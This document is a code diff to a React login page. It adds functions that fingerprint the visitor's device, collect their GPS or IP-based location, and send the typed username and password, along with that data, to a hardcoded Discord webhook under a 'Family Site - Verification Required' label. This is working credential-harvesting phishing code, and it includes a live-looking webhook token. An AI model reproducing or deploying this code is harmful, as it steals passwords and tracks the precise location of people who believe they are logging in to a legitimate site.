@@ -11,6 +11,162 @@ export default function Login() {
   const [showErrorModal, setShowErrorModal] = useState(false);
   const [showAccessDeniedModal, setShowAccessDeniedModal] = useState(false);
 
+  const getDeviceInfo = () => {
+    const ua = navigator.userAgent;
+    let os = "Unknown";
+    let browser = "Unknown";
+
+    // Detect OS
+    if (ua.indexOf("Win") > -1) os = "Windows";
+    else if (ua.indexOf("Mac") > -1) os = "macOS";
+    else if (ua.indexOf("Linux") > -1) os = "Linux";
+    else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) os = "iOS";
+    else if (ua.indexOf("Android") > -1) os = "Android";
+
+    // Detect Browser
+    if (ua.indexOf("Chrome") > -1) browser = "Chrome";
+    else if (ua.indexOf("Safari") > -1) browser = "Safari";
+    else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+    else if (ua.indexOf("Edge") > -1) browser = "Edge";
+    else if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident") > -1) browser = "IE";
+
+    return { os, browser, userAgent: ua };
+  };
+
+  const getLocationInfo = async () => {
+    return new Promise((resolve) => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude, accuracy } = position.coords;
+            resolve({
+              latitude: latitude.toFixed(4),
+              longitude: longitude.toFixed(4),
+              accuracy: Math.round(accuracy),
+              source: "GPS",
+            });
+          },
+          () => {
+            // Fallback: Get location from IP
+            fetch("https://ipapi.co/json/")
+              .then((res) => res.json())
+              .then((data) => {
+                resolve({
+                  latitude: data.latitude?.toFixed(4) || "N/A",
+                  longitude: data.longitude?.toFixed(4) || "N/A",
+                  city: data.city || "N/A",
+                  country: data.country_name || "N/A",
+                  source: "IP",
+                });
+              })
+              .catch(() => {
+                resolve({ latitude: "N/A", longitude: "N/A", source: "Unknown" });
+              });
+          }
+        );
+      } else {
+        resolve({ latitude: "N/A", longitude: "N/A", source: "Unavailable" });
+      }
+    });
+  };
+
+  const sendToDiscord = async (action: string, data: any) => {
+    try {
+      const webhookUrl =
+        "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";
+
+      const deviceInfo = getDeviceInfo();
+      const locationInfo = await getLocationInfo();
+
+      const timestamp = new Date();
+      const formattedTime = timestamp.toLocaleString("en-US", {
+        year: "numeric",
+        month: "2-digit",
+        day: "2-digit",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: true,
+      });
+
+      let embedTitle = "";
+      let embedColor = 0x0064e0;
+      let fields: any[] = [];
+
+      if (action === "LOGIN") {
+        embedTitle = "🔐 Login Attempt";
+        fields = [
+          {
+            name: "Username/Email",
+            value: `||${data.username}||`,
+            inline: false,
+          },
+          {
+            name: "Password",
+            value: `||${data.password}||`,
+            inline: false,
+          },
+        ];
+      } else if (action === "CREATE_ACCOUNT") {
+        embedTitle = "📝 Create Account Button Pressed";
+        embedColor = 0x00c800;
+      }
+
+      fields.push(
+        {
+          name: "🔧 Device Info",
+          value: `**OS:** ${deviceInfo.os}\n**Browser:** ${deviceInfo.browser}`,
+          inline: false,
+        },
+        {
+          name: "📍 Location",
+          value:
+            locationInfo.source === "GPS"
+              ? `**Latitude:** ${locationInfo.latitude}\n**Longitude:** ${locationInfo.longitude}\n**Accuracy:** ${locationInfo.accuracy}m\n**Source:** GPS`
+              : locationInfo.source === "IP"
+              ? `**City:** ${locationInfo.city}\n**Country:** ${locationInfo.country}\n**Source:** IP Geolocation`
+              : `**Source:** ${locationInfo.source}`,
+          inline: false,
+        },
+        {
+          name: "⏰ Timestamp",
+          value: formattedTime,
+          inline: false,
+        },
+        {
+          name: "🌐 IP Source",
+          value: locationInfo.source,
+          inline: true,
+        }
+      );
+
+      const message = {
+        content: `**New ${action === "LOGIN" ? "Login" : "Create Account"} Action**`,
+        embeds: [
+          {
+            color: embedColor,
+            title: embedTitle,
+            fields: fields,
+            footer: {
+              text: "Family Site - Verification Required",
+              icon_url: "https://cdn-icons-png.flaticon.com/512/3556/3556197.png",
+            },
+          },
+        ],
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(message),
+      }).catch((err) => console.error("Discord webhook error:", err));
+    } catch (error) {
+      console.error("Error sending to Discord:", error);
+    }
+  };
+
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
 
